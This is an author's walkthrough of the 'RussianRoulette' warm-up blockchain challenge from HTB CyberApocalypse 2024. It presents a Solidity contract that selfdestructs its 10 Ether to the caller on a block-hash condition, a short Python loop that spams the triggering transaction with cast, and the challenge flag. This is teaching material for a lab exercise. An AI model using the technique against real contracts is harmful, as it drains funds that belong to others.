---
date: 2024-03-09T00:00:00+01:00
title: HTB CyberApocalypse 2024 - RussianRoulette [Author Writeup]
summary: Author writeup for the "RussianRoulette" very-easy blockchain challenge from CyberApocalypse CTF 2024.
categories: ["blockchain"]
difficulty: "very-easy"
tags: ["authored", "warmup", "randomness"]
showHero: true
---

# RussianRoulette

> Date: 31<sup>st</sup> January 2024 \
Challenge Author: <font color=#1E9F9A>perrythepwner</font> \
Difficulty: <font color=green>Very Easy</font> \
Category: <font color=orange> Blockchain</font>

## TL;DR

- This challenge aims to be an entry level / warmup for the blockchain category. In order to solve, players need to send a bunch of transactions until they get lucky (i.e. pulling the trigger until the contract shot himself).


## Description

> Welcome adventurer.  
This is a warm-up to test if you have what it takes to tackle the thorny challenges of the realm. Are you brave enough to try to win this bag?

## Skills Required

- Smart contract interaction.


## Skills Learned

- Smart contract interaction.
- Block dependency


## Challenge scenario

Players will find an instance of a challenge handler when the challenge is launched, as well as the related smart contracts source code.
The main objective of this warmup challenge is to understand how to interact with a smart contract.  
By connecting to the challenge handler they will have 3 possible options:

```shell
$ nc 0.0.0.0 8001
1 - launch new instance
2 - kill instance
3 - get flag
Action? 
```

We must therefore first launch the game instance, which will also give us the information necessary to connect.

```shell
$ nc 0.0.0.0 8001
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
Your private blockchain has been deployed.
It will automatically terminate in 30 minutes.
Here's your connection info:

Team UUID: d2ee1510-3547-41ee-9712-e504f9fa8d7c
Player UUID: bd79e84b-a087-46ef-b815-9df3df2aeff9
RPC URL: http://0.0.0.0:8000/rpc/bd79e84b-a087-46ef-b815-9df3df2aeff9
Player Private Key: 0x891d623949bebefc41dabd95f8e0d9b81f5cc4924f1313c5f045df743fd70d13
Player Address: 0xcC2a1df34de11ea70879867d5b20A924DE684992
Setup Contract: 0x0570156bB596f10cf1354D488F01A9809B0C1F73
Target Contract: 0xf5d50Fe6c395aA0635Ac30039A9B3Fe16C99ef32
```

To connect to the blockchain we can use tools like [web3.py](https://github.com/ethereum/web3.py), [cast](https://book.getfoundry.sh/cast/), etc.
For the later exploitation, `cast` will be used.

## Analyzing the source code

Let's take a look to the given source codes.

### **Setup.sol**
```solidity
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return msg.sender.balance >= 10 ether;
    }
}
```

This will, indeed, setup the challenge istance for us. We understand that a `TARGET` contract will be deployed with `10 ether` in it, and in order to solve to challenge our balance needs to be `>= 10 ether` (stealing them from the newly deployed contract).

### **RussianRoulette.sol**
```solidity
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
		return "im SAFU ... for now";
	    }
    }
}
```
This is the code we need to exploit. We can see that all the logic resides inside the `pullTrigger()` function.  
The `pullTrigger` function will `selfdestruct()` to the interacting address (`msg.sender`) if some conditions are met. Otherwise it'll just return a string telling us that it is [*"SAFU"*](https://www.google.com/search?&q=safu+meaning).

But, what does `selfdestruct()` do?  
From [Solidity 0.8.23 documentation](https://docs.soliditylang.org/en/v0.8.23/introduction-to-smart-contracts.html#deactivate-and-self-destruct) the `selfdestruct` instruction will erase the code from the blockchain for the upcoming blocks, ***and will send all the Ether inside it, to the specified address***.  
In that case, the specified address, is `msg.sender`, which is the address that is sending the transaction in that moment.  
Sounds interesting!

**NOTE**: Starting from Solidity 0.8.24 ("Cancun" upgrade), it'll change the behavior of "selfdestruct". It will no longer clear the contract code unless it's called on the deploying transaction. https://twitter.com/solidity_lang/status/1750775408013046257

{{< alert "circle-info" >}}
**Fun Fact**: did you know that `SELFDESTRUCT` was once called `SUICIDE` and there is a `SELFDESTRUCT` alias for `SUICIDE` in Solidity? Here's the official EIP: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-6.md
{{< /alert >}}

Having understood how `selfdestruct()` works in the Solidity version specified in the contract, we need to understand in what circumstances we will be rich.

```solidity
uint256(blockhash(block.number - 1)) % 10 == 7
```

This is the condition we need to trigger, which will simply take the previous block hash, convert it to uint256 (from bytes32), modulo it by 10, and if the reminder is 7, the contract will successfully headshot itself.  
Calling the function a bunch of times until we get lucky will do the work.    
That's called a Block Dependency issue, even if an unprotected selfdestruct on random function calls won't be a smart idea anyway :P


## Exploitation

```python
while True:
    # try luck
    system("cast send $TARGET 'pullTrigger()' --rpc-url $RPC_URL --private-key $PVK") 
    
    # get flag
    with remote("0.0.0.0", HANDLER_PORT) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
        break
```

> HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}